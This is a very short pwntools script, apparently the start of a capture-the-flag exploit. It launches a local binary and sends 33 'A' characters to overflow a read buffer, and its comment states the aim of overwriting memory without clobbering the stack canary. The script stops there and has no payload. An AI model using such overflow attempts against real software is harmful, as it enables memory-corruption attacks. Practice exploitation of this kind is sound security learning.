from pwn import *







# so the goal is to overflow the read buffer to overwrite part of memory and somehow not clobber the canary 
r = process('./challenge')
r.sendlineafter("> ", "A" * 33)




